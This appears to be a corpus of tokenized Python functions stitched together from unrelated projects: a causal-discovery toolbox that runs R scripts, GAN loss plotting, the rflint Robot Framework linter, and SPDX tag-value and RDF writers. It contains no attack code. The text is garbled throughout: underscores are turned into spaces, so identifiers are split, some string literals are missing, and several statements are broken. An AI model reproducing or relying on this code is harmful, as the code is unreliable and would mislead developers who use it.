def run gies ( self , data , fixed Gaps = None , verbose = True ) : # Run gies id = str ( uuid . uuid4 ( ) ) os . makedirs ( '/tmp/cdt gies' + id + '/' ) self . arguments [ '{FOLDER}' ] = '/tmp/cdt gies' + id + '/' def retrieve result ( ) : return read csv ( '/tmp/cdt gies' + id + '/result.csv' , delimiter = ',' ) . values try : data . to csv ( '/tmp/cdt gies' + id + '/data.csv' , header = False , index = False ) if fixed Gaps is not None : fixed Gaps . to csv ( '/tmp/cdt gies' + id + '/fixedgaps.csv' , index = False , header = False ) self . arguments [ '{SKELETON}' ] = 'TRUE' else : self . arguments [ '{SKELETON}' ] = 'FALSE' gies result = launch R script ( "{}/R templates/gies.R" . format ( os . path . dirname ( os . path . realpath ( file ) ) ) , self . arguments , output function = retrieve result , verbose = verbose ) # Cleanup except Exception as e : rmtree ( '/tmp/cdt gies' + id + '' ) raise e except Keyboard Interrupt : rmtree ( '/tmp/cdt gies' + id + '/' ) raise Keyboard Interrupt rmtree ( '/tmp/cdt gies' + id + '' ) return gies result
def plot curves ( i batch , adv loss , gen loss , l1 reg , cols ) : from matplotlib import pyplot as plt if i batch == 0 : try : ax . clear ( ) ax . plot ( range ( len ( adv plt ) ) , adv plt , "r-" , linewidth = 1.5 , markersize = 4 , label = "Discriminator" ) ax . plot ( range ( len ( adv plt ) ) , gen plt , "g-" , linewidth = 1.5 , markersize = 4 , label = "Generators" ) ax . plot ( range ( len ( adv plt ) ) , l1 plt , "b-" , linewidth = 1.5 , markersize = 4 , label = "L1-Regularization" ) plt . legend ( ) adv plt . append ( adv loss . cpu ( ) . data [ 0 ] ) gen plt . append ( gen loss . cpu ( ) . data [ 0 ] / cols ) l1 plt . append ( l1 reg . cpu ( ) . data [ 0 ] ) plt . pause ( 0.0001 ) except Name Error : plt . ion ( ) fig , ax = plt . figure ( ) plt . xlabel ( "Epoch" ) plt . ylabel ( "Losses" ) plt . pause ( 0.0001 ) adv plt = [ adv loss . cpu ( ) . data [ 0 ] ] gen plt = [ gen loss . cpu ( ) . data [ 0 ] / cols ] l1 plt = [ l1 reg . cpu ( ) . data [ 0 ] ] else : adv plt . append ( adv loss . cpu ( ) . data [ 0 ] ) gen plt . append ( gen loss . cpu ( ) . data [ 0 ] / cols ) l1 plt . append ( l1 reg . cpu ( ) . data [ 0 ] )
def plot gen ( epoch , batch , generated variables , pairs to plot = [ [ 0 , 1 ] ] ) : from matplotlib import pyplot as plt if epoch == 0 : plt . ion ( ) plt . clf ( ) for ( i , j ) in pairs to plot : plt . scatter ( generated variables [ i ] . data . cpu ( ) . numpy ( ) , batch . data . cpu ( ) . numpy ( ) [ : , j ] , label = "Y -> X" ) plt . scatter ( batch . data . cpu ( ) . numpy ( ) [ : , i ] , generated variables [ j ] . data . cpu ( ) . numpy ( ) , label = "X -> Y" ) plt . scatter ( batch . data . cpu ( ) . numpy ( ) [ : , i ] , batch . data . cpu ( ) . numpy ( ) [ : , j ] , label = "original data" ) plt . legend ( ) plt . pause ( 0.01 )
def reset parameters ( self ) : stdv = 1. / math . sqrt ( self . weight . size ( 1 ) ) self . weight . data . uniform ( - stdv , stdv ) if self . bias is not None : self . bias . data . uniform ( - stdv , stdv )
def forward ( self , input ) : return th . nn . functional . linear ( input , self . weight . div ( self . weight . pow ( 2 ) . sum ( 0 ) . sqrt ( ) ) )
def forward ( self , x ) : return self . layers ( x * ( self . filter * self . fs filter ) . expand as ( x ) )
def forward ( self , x ) : for i in self . noise : i . data . normal ( ) self . generated variables = [ self . blocks [ i ] ( th . cat ( [ x , self . noise [ i ] ] , 1 ) ) for i in range ( self . cols ) ] return self . generated variables
def run pc ( self , data , fixed Edges = None , fixed Gaps = None , verbose = True ) : # Checking coherence of arguments # print(self.arguments) if ( self . arguments [ '{CITEST}' ] == self . dir CI test [ 'hsic' ] and self . arguments [ '{METHOD INDEP}' ] == self . dir method indep [ 'corr' ] ) : warnings . warn ( 'Selected method for indep is unfit for the hsic test,' ' setting the hsic.gamma method.' ) self . arguments [ '{METHOD INDEP}' ] = self . dir method indep [ 'hsic gamma' ] elif ( self . arguments [ '{CITEST}' ] == self . dir CI test [ 'gaussian' ] and self . arguments [ '{METHOD INDEP}' ] != self . dir method indep [ 'corr' ] ) : warnings . warn ( 'Selected method for indep is unfit for the selected test,' ' setting the classic correlation-based method.' ) self . arguments [ '{METHOD INDEP}' ] = self . dir method indep [ 'corr' ] # Run PC id = str ( uuid . uuid4 ( ) ) os . makedirs ( '/tmp/cdt pc' + id + '/' ) self . arguments [ '{FOLDER}' ] = '/tmp/cdt pc' + id + '/' def retrieve result ( ) : return read csv ( '/tmp/cdt pc' + id + '/result.csv' , delimiter = ',' ) . values try : data . to csv ( '/tmp/cdt pc' + id + '/data.csv' , header = False , index = False ) if fixed Gaps is not None and fixed Edges is not None : fixed Gaps . to csv ( '/tmp/cdt pc' + id + '/fixedgaps.csv' , index = False , header = False ) fixed Edges . to csv ( '/tmp/cdt pc' + id + '/fixededges.csv' , index = False , header = False ) self . arguments [ '{SKELETON}' ] = 'TRUE' else : self . arguments [ '{SKELETON}' ] = 'FALSE' pc result = launch R script ( "{}/R templates/pc.R" . format ( os . path . dirname ( os . path . realpath ( file ) ) ) , self . arguments , output function = retrieve result , verbose = verbose ) # Cleanup except Exception as e : rmtree ( '/tmp/cdt pc' + id + '' ) raise e except Keyboard Interrupt : rmtree ( '/tmp/cdt pc' + id + '/' ) raise Keyboard Interrupt rmtree ( '/tmp/cdt pc' + id + '' ) return pc result
def compute Gauss Kernel ( x ) : xnorm = np . power ( euclidean distances ( x , x ) , 2 ) return np . exp ( - xnorm / ( 2.0 ) )
def normal noise ( points ) : return np . random . rand ( 1 ) * np . random . randn ( points , 1 ) + random . sample ( [ 2 , - 2 ] , 1 )
def uniform noise ( points ) : return np . random . rand ( 1 ) * np . random . uniform ( points , 1 ) + random . sample ( [ 2 , - 2 ] , 1 )
def run ( self , x , y , lr = 0.01 , train epochs = 1000 , test epochs = 1000 , idx = 0 , verbose = None , * * kwargs ) : verbose = SETTINGS . get default ( verbose = verbose ) optim = th . optim . Adam ( self . parameters ( ) , lr = lr ) running loss = 0 teloss = 0 for i in range ( train epochs + test epochs ) : optim . zero grad ( ) pred = self . forward ( x ) loss = self . criterion ( pred , y ) running loss += loss . item ( ) if i < train epochs : loss . backward ( ) optim . step ( ) else : teloss += running loss # print statistics if verbose and not i % 300 : print ( 'Idx:{}; epoch:{}; score:{}' . format ( idx , i , running loss / 300 ) ) running loss = 0.0 return teloss / test epochs
def init variables ( self , verbose = False ) : # Resetting adjacency matrix for i in range ( self . nodes ) : for j in np . random . choice ( range ( self . nodes ) , np . random . randint ( 0 , self . parents max + 1 ) , replace = False ) : if i != j : self . adjacency matrix [ j , i ] = 1 try : assert any ( [ sum ( self . adjacency matrix [ : , i ] ) == self . parents max for i in range ( self . nodes ) ] ) self . g = nx . Di Graph ( self . adjacency matrix ) assert list ( nx . simple cycles ( self . g ) ) assert any ( len ( i ) == 2 for i in nx . simple cycles ( self . g ) ) except Assertion Error : if verbose : print ( "Regenerating, graph non valid..." ) self . init variables ( ) if verbose : print ( . format ( len ( list ( nx . simple cycles ( self . g ) ) ) ) ) for i in range ( self . nodes ) : self . data . iloc [ : , i ] = scale ( self . initial generator ( self . points ) ) # Mechanisms self . cfunctions = [ self . mechanism ( int ( sum ( self . adjacency matrix [ : , i ] ) ) , self . points , self . noise , noise coeff = self . noise coeff ) for i in range ( self . nodes ) ]
def generate ( self , nb steps = 100 , averaging = 50 , rescale = True ) : if self . cfunctions is None : self . init variables ( ) new df = pd . Data Frame ( ) causes = [ [ c for c in np . nonzero ( self . adjacency matrix [ : , j ] ) [ 0 ] ] for j in range ( self . nodes ) ] values = [ [ ] for i in range ( self . nodes ) ] for i in range ( nb steps ) : for j in range ( self . nodes ) : new df [ "V" + str ( j ) ] = self . cfunctions [ j ] ( self . data . iloc [ : , causes [ j ] ] . values ) [ : , 0 ] if rescale : new df [ "V" + str ( j ) ] = scale ( new df [ "V" + str ( j ) ] ) if i > nb steps - averaging : values [ j ] . append ( new df [ "V" + str ( j ) ] ) self . data = new df self . data = pd . Data Frame ( np . array ( [ np . mean ( values [ i ] , axis = 0 ) for i in range ( self . nodes ) ] ) . transpose ( ) , columns = [ "V{}" . format ( j ) for j in range ( self . nodes ) ] ) return self . g , self . data
def phrase to filename ( self , phrase ) : # remove non-word characters name = re . sub ( r"[^\w\s\.]" , '' , phrase . strip ( ) . lower ( ) ) # replace whitespace with underscores name = re . sub ( r"\s+" , ' ' , name ) return name + '.png'
def wait for page to load ( self ) : self . wait . until ( lambda : self . loaded ) self . pm . hook . pypom after wait for page to load ( page = self ) return self
def wait for region to load ( self ) : self . wait . until ( lambda : self . loaded ) self . pm . hook . pypom after wait for region to load ( region = self ) return self
def register Driver ( iface , driver , class implements = [ ] ) : for class item in class implements : class Implements ( class item , iface ) component . provide Adapter ( factory = driver , adapts = [ iface ] , provides = I Driver )
def pre install ( ) : # Generate the parsetab.dat file at setup time dat = join ( setup dir , 'src' , 'hcl' , 'parsetab.dat' ) if exists ( dat ) : os . unlink ( dat ) sys . path . insert ( 0 , join ( setup dir , 'src' ) ) import hcl from hcl . parser import Hcl Parser parser = Hcl Parser ( )
def append ( self , linenumber , raw text , cells ) : self . rows . append ( Row ( linenumber , raw text , cells ) )
def is comment ( self ) : for cell in self [ : ] : if cell == "" : continue # this is the first non-empty cell. Check whether it is # a comment or not. if cell . lstrip ( ) . startswith ( "#" ) : return True else : return False return False
def keywords ( self ) : for table in self . tables : if isinstance ( table , Keyword Table ) : for keyword in table . keywords : yield keyword
def dump ( self ) : for table in self . tables : print ( "*** %s ***" % table . name ) table . dump ( )
def settings ( self ) : for table in self . tables : if isinstance ( table , Setting Table ) : for statement in table . statements : yield statement
def variables ( self ) : for table in self . tables : if isinstance ( table , Variable Table ) : # FIXME: settings have statements, variables have rows WTF? :-( for statement in table . rows : if statement [ 0 ] != "" : yield statement
def report ( self , obj , message , linenum , char offset = 0 ) : self . controller . report ( linenumber = linenum , filename = obj . path , severity = self . severity , message = message , rulename = self . class . name , char = char offset )
def run ( self , args ) : self . args = self . parse and process args ( args ) if self . args . version : print ( version ) return 0 if self . args . rulefile : for filename in self . args . rulefile : self . load rule file ( filename ) if self . args . list : self . list rules ( ) return 0 if self . args . describe : self . describe rules ( self . args . args ) return 0 self . counts = { ERROR : 0 , WARNING : 0 , "other" : 0 } for filename in self . args . args : if not ( os . path . exists ( filename ) ) : sys . stderr . write ( "rflint: %s: No such file or directory\n" % filename ) continue if os . path . isdir ( filename ) : self . process folder ( filename ) else : self . process file ( filename ) if self . counts [ ERROR ] > 0 : return self . counts [ ERROR ] if self . counts [ ERROR ] < 254 else 255 return 0
def list rules ( self ) : for rule in sorted ( self . all rules , key = lambda rule : rule . name ) : print ( rule ) if self . args . verbose : for line in rule . doc . split ( "\n" ) : print ( "    " , line )
def report ( self , linenumber , filename , severity , message , rulename , char ) : if self . print filename is not None : # we print the filename only once. self. print filename # will get reset each time a new file is processed. print ( "+ " + self . print filename ) self . print filename = None if severity in ( WARNING , ERROR ) : self . counts [ severity ] += 1 else : self . counts [ "other" ] += 1 print ( self . args . format . format ( linenumber = linenumber , filename = filename , severity = severity , message = message . encode ( 'utf-8' ) , rulename = rulename , char = char ) )
def load rule file ( self , filename ) : if not ( os . path . exists ( filename ) ) : sys . stderr . write ( "rflint: %s: No such file or directory\n" % filename ) return try : basename = os . path . basename ( filename ) ( name , ext ) = os . path . splitext ( basename ) imp . load source ( name , filename ) except Exception as e : sys . stderr . write ( "rflint: %s: exception while loading: %s\n" % ( filename , str ( e ) ) )
def parse and process args ( self , args ) : parser = argparse . Argument Parser ( prog = "python -m rflint" , description = "A style checker for robot framework plain text files." , formatter class = argparse . Raw Description Help Formatter , epilog = ( "You can use 'all' in place of RULENAME to refer to all rules. \n" "\n" "For example: '--ignore all --warn Duplicate Test Names' will ignore all\n" "rules except Duplicate Test Names.\n" "\n" "FORMAT is a string that performs a substitution on the following \n" "patterns: {severity}, {linenumber}, {char}, {message}, and {rulename}.\n" "\n" "For example: --format 'line: {linenumber}: message: {message}'. \n" "\n" "ARGUMENTFILE is a filename with contents that match the format of \n" "standard robot framework argument files\n" "\n" "If you give a directory as an argument, all files in the directory\n" "with the suffix .txt, .robot or .tsv will be processed. With the \n" "--recursive option, subfolders within the directory will also be\n" "processed." ) ) parser . add argument ( "--error" , "-e" , metavar = "RULENAME" , action = Set Error Action , help = "Assign a severity of ERROR to the given RULENAME" ) parser . add argument ( "--ignore" , "-i" , metavar = "RULENAME" , action = Set Ignore Action , help = "Ignore the given RULENAME" ) parser . add argument ( "--warning" , "-w" , metavar = "RULENAME" , action = Set Warning Action , help = "Assign a severity of WARNING for the given RULENAME" ) parser . add argument ( "--list" , "-l" , action = "store true" , help = "show a list of known rules and exit" ) parser . add argument ( "--describe" , "-d" , action = "store true" , help = "describe the given rules" ) parser . add argument ( "--no-filenames" , action = "store false" , dest = "print filenames" , default = True , help = "suppress the printing of filenames" ) parser . add argument ( "--format" , "-f" , help = "Define the output format" , default = '{severity}: {linenumber}, {char}: {message} ({rulename})' ) parser . add argument ( "--version" , action = "store true" , default = False , help = "Display version number and exit" ) parser . add argument ( "--verbose" , "-v" , action = "store true" , default = False , help = "Give verbose output" ) parser . add argument ( "--configure" , "-c" , action = Configure Action , help = "Configure a rule" ) parser . add argument ( "--recursive" , "-r" , action = "store true" , default = False , help = "Recursively scan subfolders in a directory" ) parser . add argument ( "--rulefile" , "-R" , action = Rulefile Action , help = "import additional rules from the given RULEFILE" ) parser . add argument ( "--argumentfile" , "-A" , action = Argfile Loader , help = "read arguments from the given file" ) parser . add argument ( 'args' , metavar = "file" , nargs = argparse . REMAINDER ) # create a custom namespace, in which we can store a reference to # our rules. This lets the custom argument actions access the list # of rules ns = argparse . Namespace ( ) setattr ( ns , "app" , self ) args = parser . parse args ( args , ns ) Rule . output format = args . format return args
def read yaml file ( path , loader = Extended Safe Loader ) : with open ( path ) as fh : return load ( fh , loader )
def f7 ( seq ) : seen = set ( ) seen add = seen . add return [ x for x in seq if x not in seen and not seen add ( x ) ]
def count list ( the list ) : count = the list . count result = [ ( item , count ( item ) ) for item in set ( the list ) ] result . sort ( ) return result
def write creation info ( creation info , out ) : out . write ( '# Creation Info\n\n' ) # Write sorted creators for creator in sorted ( creation info . creators ) : write value ( 'Creator' , creator , out ) # write created write value ( 'Created' , creation info . created iso format , out ) # possible comment if creation info . has comment : write text value ( 'Creator Comment' , creation info . comment , out )
def write review ( review , out ) : out . write ( '# Review\n\n' ) write value ( 'Reviewer' , review . reviewer , out ) write value ( 'Review Date' , review . review date iso format , out ) if review . has comment : write text value ( 'Review Comment' , review . comment , out )
def write annotation ( annotation , out ) : out . write ( '# Annotation\n\n' ) write value ( 'Annotator' , annotation . annotator , out ) write value ( 'Annotation Date' , annotation . annotation date iso format , out ) if annotation . has comment : write text value ( 'Annotation Comment' , annotation . comment , out ) write value ( 'Annotation Type' , annotation . annotation type , out ) write value ( 'SPDXREF' , annotation . spdx id , out )
def write file ( spdx file , out ) : out . write ( '# File\n\n' ) write value ( 'File Name' , spdx file . name , out ) write value ( 'SPDXID' , spdx file . spdx id , out ) if spdx file . has optional field ( 'type' ) : write file type ( spdx file . type , out ) write value ( 'File Checksum' , spdx file . chk sum . to tv ( ) , out ) if isinstance ( spdx file . conc lics , ( document . License Conjunction , document . License Disjunction ) ) : write value ( 'License Concluded' , u'({0})' . format ( spdx file . conc lics ) , out ) else : write value ( 'License Concluded' , spdx file . conc lics , out ) # write sorted list for lics in sorted ( spdx file . licenses in file ) : write value ( 'License Info In File' , lics , out ) if isinstance ( spdx file . copyright , six . string types ) : write text value ( 'File Copyright Text' , spdx file . copyright , out ) else : write value ( 'File Copyright Text' , spdx file . copyright , out ) if spdx file . has optional field ( 'license comment' ) : write text value ( 'License Comments' , spdx file . license comment , out ) if spdx file . has optional field ( 'comment' ) : write text value ( 'File Comment' , spdx file . comment , out ) if spdx file . has optional field ( 'notice' ) : write text value ( 'File Notice' , spdx file . notice , out ) for contributor in sorted ( spdx file . contributors ) : write value ( 'File Contributor' , contributor , out ) for dependency in sorted ( spdx file . dependencies ) : write value ( 'File Dependency' , dependency , out ) names = spdx file . artifact of project name homepages = spdx file . artifact of project home uris = spdx file . artifact of project uri for name , homepage , uri in sorted ( zip longest ( names , homepages , uris ) ) : write value ( 'Artifact Of Project Name' , name , out ) if homepage is not None : write value ( 'Artifact Of Project Home Page' , homepage , out ) if uri is not None : write value ( 'Artifact Of Project URI' , uri , out )
def write package ( package , out ) : out . write ( '# Package\n\n' ) write value ( 'Package Name' , package . name , out ) if package . has optional field ( 'version' ) : write value ( 'Package Version' , package . version , out ) write value ( 'Package Download Location' , package . download location , out ) if package . has optional field ( 'summary' ) : write text value ( 'Package Summary' , package . summary , out ) if package . has optional field ( 'source info' ) : write text value ( 'Package Source Info' , package . source info , out ) if package . has optional field ( 'file name' ) : write value ( 'Package File Name' , package . file name , out ) if package . has optional field ( 'supplier' ) : write value ( 'Package Supplier' , package . supplier , out ) if package . has optional field ( 'originator' ) : write value ( 'Package Originator' , package . originator , out ) if package . has optional field ( 'check sum' ) : write value ( 'Package Checksum' , package . check sum . to tv ( ) , out ) write value ( 'Package Verification Code' , format verif code ( package ) , out ) if package . has optional field ( 'description' ) : write text value ( 'Package Description' , package . description , out ) if isinstance ( package . license declared , ( document . License Conjunction , document . License Disjunction ) ) : write value ( 'Package License Declared' , u'({0})' . format ( package . license declared ) , out ) else : write value ( 'Package License Declared' , package . license declared , out ) if isinstance ( package . conc lics , ( document . License Conjunction , document . License Disjunction ) ) : write value ( 'Package License Concluded' , u'({0})' . format ( package . conc lics ) , out ) else : write value ( 'Package License Concluded' , package . conc lics , out ) # Write sorted list of licenses. for lics in sorted ( package . licenses from files ) : write value ( 'Package License Info From Files' , lics , out ) if package . has optional field ( 'license comment' ) : write text value ( 'Package License Comments' , package . license comment , out ) # cr text is either free form text or NONE or NOASSERTION. if isinstance ( package . cr text , six . string types ) : write text value ( 'Package Copyright Text' , package . cr text , out ) else : write value ( 'Package Copyright Text' , package . cr text , out ) if package . has optional field ( 'homepage' ) : write value ( 'Package Home Page' , package . homepage , out ) # Write sorted files. for spdx file in sorted ( package . files ) : write separators ( out ) write file ( spdx file , out )
def write extracted licenses ( lics , out ) : write value ( 'License ID' , lics . identifier , out ) if lics . full name is not None : write value ( 'License Name' , lics . full name , out ) if lics . comment is not None : write text value ( 'License Comment' , lics . comment , out ) for xref in sorted ( lics . cross ref ) : write value ( 'License Cross Reference' , xref , out ) write text value ( 'Extracted Text' , lics . text , out )
def str from text ( text ) : REGEX = re . compile ( '<text>((.|\n)+)</text>' , re . UNICODE ) match = REGEX . match ( text ) if match : return match . group ( 1 ) else : return None
def reset document ( self ) : # FIXME: this state does not make sense self . doc version set = False self . doc comment set = False self . doc namespace set = False self . doc data lics set = False self . doc name set = False self . doc spdx id set = False
def reset creation info ( self ) : # FIXME: this state does not make sense self . created date set = False self . creation comment set = False self . lics list ver set = False
def reset annotations ( self ) : # FIXME: this state does not make sense self . annotation date set = False self . annotation comment set = False self . annotation type set = False self . annotation spdx id set = False
def reset package ( self ) : # FIXME: this state does not make sense self . package set = False self . package vers set = False self . package file name set = False self . package supplier set = False self . package originator set = False self . package down location set = False self . package home set = False self . package verif set = False self . package chk sum set = False self . package source info set = False self . package conc lics set = False self . package license declared set = False self . package license comment set = False self . package cr text set = False self . package summary set = False self . package desc set = False
def set file name ( self , doc , name ) : if self . has package ( doc ) : doc . package . files . append ( file . File ( name ) ) # A file name marks the start of a new file instance. # The builder must be reset # FIXME: this state does not make sense self . reset file stat ( ) return True else : raise Order Error ( 'File::Name' )
def add file contribution ( self , doc , value ) : if self . has package ( doc ) and self . has file ( doc ) : self . file ( doc ) . add contrib ( value ) else : raise Order Error ( 'File::Contributor' )
def add file dep ( self , doc , value ) : if self . has package ( doc ) and self . has file ( doc ) : self . file ( doc ) . add depend ( value ) else : raise Order Error ( 'File::Dependency' )
def reset file stat ( self ) : # FIXME: this state does not make sense self . file spdx id set = False self . file comment set = False self . file type set = False self . file chksum set = False self . file conc lics set = False self . file license comment set = False self . file notice set = False self . file copytext set = False
def datetime iso format ( date ) : return "{0:0>4}-{1:0>2}-{2:0>2}T{3:0>2}:{4:0>2}:{5:0>2}Z" . format ( date . year , date . month , date . day , date . hour , date . minute , date . second )
def build ( self , * * kwargs ) : self . yacc = yacc . yacc ( module = self , * * kwargs )
def parse ( self , data ) : try : return self . yacc . parse ( data , lexer = self . lex ) except : return None
def create checksum node ( self , chksum ) : chksum node = B Node ( ) type triple = ( chksum node , RDF . type , self . spdx namespace . Checksum ) self . graph . add ( type triple ) algorithm triple = ( chksum node , self . spdx namespace . algorithm , Literal ( chksum . identifier ) ) self . graph . add ( algorithm triple ) value triple = ( chksum node , self . spdx namespace . checksum Value , Literal ( chksum . value ) ) self . graph . add ( value triple ) return chksum node
def to special value ( self , value ) : if isinstance ( value , utils . No Assert ) : return self . spdx namespace . noassertion elif isinstance ( value , utils . SPDX None ) : return self . spdx namespace . none else : return Literal ( value )
def create conjunction node ( self , conjunction ) : node = B Node ( ) type triple = ( node , RDF . type , self . spdx namespace . Conjunctive License Set ) self . graph . add ( type triple ) licenses = self . licenses from tree ( conjunction ) for lic in licenses : member triple = ( node , self . spdx namespace . member , lic ) self . graph . add ( member triple ) return node
def create disjunction node ( self , disjunction ) : node = B Node ( ) type triple = ( node , RDF . type , self . spdx namespace . Disjunctive License Set ) self . graph . add ( type triple ) licenses = self . licenses from tree ( disjunction ) for lic in licenses : member triple = ( node , self . spdx namespace . member , lic ) self . graph . add ( member triple ) return node
def create file node ( self , doc file ) : file node = URI Ref ( 'http://www.spdx.org/files#{id}' . format ( id = str ( doc file . spdx id ) ) ) type triple = ( file node , RDF . type , self . spdx namespace . File ) self . graph . add ( type triple ) name triple = ( file node , self . spdx namespace . file Name , Literal ( doc file . name ) ) self . graph . add ( name triple ) if doc file . has optional field ( 'comment' ) : comment triple = ( file node , RDFS . comment , Literal ( doc file . comment ) ) self . graph . add ( comment triple ) if doc file . has optional field ( 'type' ) : ftype = self . spdx namespace [ self . FILE TYPES [ doc file . type ] ] ftype triple = ( file node , self . spdx namespace . file Type , ftype ) self . graph . add ( ftype triple ) self . graph . add ( ( file node , self . spdx namespace . checksum , self . create checksum node ( doc file . chk sum ) ) ) conc lic node = self . license or special ( doc file . conc lics ) conc lic triple = ( file node , self . spdx namespace . license Concluded , conc lic node ) self . graph . add ( conc lic triple ) license info nodes = map ( self . license or special , doc file . licenses in file ) for lic in license info nodes : triple = ( file node , self . spdx namespace . license Info In File , lic ) self . graph . add ( triple ) if doc file . has optional field ( 'license comment' ) : comment triple = ( file node , self . spdx namespace . license Comments , Literal ( doc file . license comment ) ) self . graph . add ( comment triple ) cr text node = self . to special value ( doc file . copyright ) cr text triple = ( file node , self . spdx namespace . copyright Text , cr text node ) self . graph . add ( cr text triple ) if doc file . has optional field ( 'notice' ) : notice triple = ( file node , self . spdx namespace . notice Text , doc file . notice ) self . graph . add ( notice triple ) contrib nodes = map ( lambda c : Literal ( c ) , doc file . contributors ) contrib triples = [ ( file node , self . spdx namespace . file Contributor , node ) for node in contrib nodes ] for triple in contrib triples : self . graph . add ( triple ) return file node
def create review node ( self , review ) : review node = B Node ( ) type triple = ( review node , RDF . type , self . spdx namespace . Review ) self . graph . add ( type triple ) reviewer node = Literal ( review . reviewer . to value ( ) ) self . graph . add ( ( review node , self . spdx namespace . reviewer , reviewer node ) ) reviewed date node = Literal ( review . review date iso format ) reviewed triple = ( review node , self . spdx namespace . review Date , reviewed date node ) self . graph . add ( reviewed triple ) if review . has comment : comment node = Literal ( review . comment ) comment triple = ( review node , RDFS . comment , comment node ) self . graph . add ( comment triple ) return review node
def create annotation node ( self , annotation ) : annotation node = URI Ref ( str ( annotation . spdx id ) ) type triple = ( annotation node , RDF . type , self . spdx namespace . Annotation ) self . graph . add ( type triple ) annotator node = Literal ( annotation . annotator . to value ( ) ) self . graph . add ( ( annotation node , self . spdx namespace . annotator , annotator node ) ) annotation date node = Literal ( annotation . annotation date iso format ) annotation triple = ( annotation node , self . spdx namespace . annotation Date , annotation date node ) self . graph . add ( annotation triple ) if annotation . has comment : comment node = Literal ( annotation . comment ) comment triple = ( annotation node , RDFS . comment , comment node ) self . graph . add ( comment triple ) annotation type node = Literal ( annotation . annotation type ) annotation type triple = ( annotation node , self . spdx namespace . annotation Type , annotation type node ) self . graph . add ( annotation type triple ) return annotation node
def create creation info ( self ) : ci node = B Node ( ) # Type property type triple = ( ci node , RDF . type , self . spdx namespace . Creation Info ) self . graph . add ( type triple ) created date = Literal ( self . document . creation info . created iso format ) created triple = ( ci node , self . spdx namespace . created , created date ) self . graph . add ( created triple ) creators = self . creators ( ) for creator in creators : self . graph . add ( ( ci node , self . spdx namespace . creator , creator ) ) if self . document . creation info . has comment : comment node = Literal ( self . document . creation info . comment ) comment triple = ( ci node , RDFS . comment , comment node ) self . graph . add ( comment triple ) return ci node
def create external document ref node ( self , ext document references ) : ext doc ref node = B Node ( ) type triple = ( ext doc ref node , RDF . type , self . spdx namespace . External Document Ref ) self . graph . add ( type triple ) ext doc id = Literal ( ext document references . external document id ) ext doc id triple = ( ext doc ref node , self . spdx namespace . external Document Id , ext doc id ) self . graph . add ( ext doc id triple ) doc uri = Literal ( ext document references . spdx document uri ) doc uri triple = ( ext doc ref node , self . spdx namespace . spdx Document , doc uri ) self . graph . add ( doc uri triple ) checksum node = self . create checksum node ( ext document references . check sum ) self . graph . add ( ( ext doc ref node , self . spdx namespace . checksum , checksum node ) ) return ext doc ref node
def package verif node ( self , package ) : verif node = B Node ( ) type triple = ( verif node , RDF . type , self . spdx namespace . Package Verification Code ) self . graph . add ( type triple ) value triple = ( verif node , self . spdx namespace . package Verification Code Value , Literal ( package . verif code ) ) self . graph . add ( value triple ) excl file nodes = map ( lambda excl : Literal ( excl ) , package . verif exc files ) excl predicate = self . spdx namespace . package Verification Code Excluded File excl file triples = [ ( verif node , excl predicate , xcl file ) for xcl file in excl file nodes ] for trp in excl file triples : self . graph . add ( trp ) return verif node
def handle pkg optional fields ( self , package , package node ) : self . handle package literal optional ( package , package node , self . spdx namespace . version Info , 'version' ) self . handle package literal optional ( package , package node , self . spdx namespace . package File Name , 'file name' ) self . handle package literal optional ( package , package node , self . spdx namespace . supplier , 'supplier' ) self . handle package literal optional ( package , package node , self . spdx namespace . originator , 'originator' ) self . handle package literal optional ( package , package node , self . spdx namespace . source Info , 'source info' ) self . handle package literal optional ( package , package node , self . spdx namespace . license Comments , 'license comment' ) self . handle package literal optional ( package , package node , self . spdx namespace . summary , 'summary' ) self . handle package literal optional ( package , package node , self . spdx namespace . description , 'description' ) if package . has optional field ( 'check sum' ) : checksum node = self . create checksum node ( package . check sum ) self . graph . add ( ( package node , self . spdx namespace . checksum , checksum node ) ) if package . has optional field ( 'homepage' ) : homepage node = URI Ref ( self . to special value ( package . homepage ) ) homepage triple = ( package node , self . doap namespace . homepage , homepage node ) self . graph . add ( homepage triple )
def create doc ( self ) : doc node = URI Ref ( 'http://www.spdx.org/tools#SPDX Ref-DOCUMENT' ) # Doc type self . graph . add ( ( doc node , RDF . type , self . spdx namespace . Spdx Document ) ) # Version vers literal = Literal ( str ( self . document . version ) ) self . graph . add ( ( doc node , self . spdx namespace . spec Version , vers literal ) ) # Data license data lics = URI Ref ( self . document . data license . url ) self . graph . add ( ( doc node , self . spdx namespace . data License , data lics ) ) doc name = URI Ref ( self . document . name ) self . graph . add ( ( doc node , self . spdx namespace . name , doc name ) ) return doc node
def handle lics ( self , lics ) : # Handle extracted licensing info type. if ( lics , RDF . type , self . spdx namespace [ 'Extracted Licensing Info' ] ) in self . graph : return self . parse only extr license ( lics ) # Assume resource, hence the path separator ident start = lics . rfind ( '/' ) + 1 if ident start == 0 : # special values such as spdx:noassertion special = self . to special value ( lics ) if special == lics : if self . LICS REF REGEX . match ( lics ) : # Is a license ref i.e License Ref-1 return document . License . from identifier ( lics ) else : # Not a known license form raise SPDX Value Error ( 'License' ) else : # is a special value return special else : # license url return document . License . from identifier ( lics [ ident start : ] )
def get extr license ident ( self , extr lic ) : identifier tripples = list ( self . graph . triples ( ( extr lic , self . spdx namespace [ 'license Id' ] , None ) ) ) if not identifier tripples : self . error = True msg = 'Extracted license must have license Id property.' self . logger . log ( msg ) return if len ( identifier tripples ) > 1 : self . more than one error ( 'extracted license identifier tripples' ) return identifier tripple = identifier tripples [ 0 ] s , p , identifier = identifier tripple return identifier
def get extr license text ( self , extr lic ) : text tripples = list ( self . graph . triples ( ( extr lic , self . spdx namespace [ 'extracted Text' ] , None ) ) ) if not text tripples : self . error = True msg = 'Extracted license must have extracted Text property' self . logger . log ( msg ) return if len ( text tripples ) > 1 : self . more than one error ( 'extracted license text' ) return text tripple = text tripples [ 0 ] s , p , text = text tripple return text
def get extr lic name ( self , extr lic ) : extr name list = list ( self . graph . triples ( ( extr lic , self . spdx namespace [ 'license Name' ] , None ) ) ) if len ( extr name list ) > 1 : self . more than one error ( 'extracted license name' ) return elif len ( extr name list ) == 0 : return return self . to special value ( extr name list [ 0 ] [ 2 ] )
def get extr lics xref ( self , extr lic ) : xrefs = list ( self . graph . triples ( ( extr lic , RDFS . see Also , None ) ) ) return map ( lambda xref triple : xref triple [ 2 ] , xrefs )
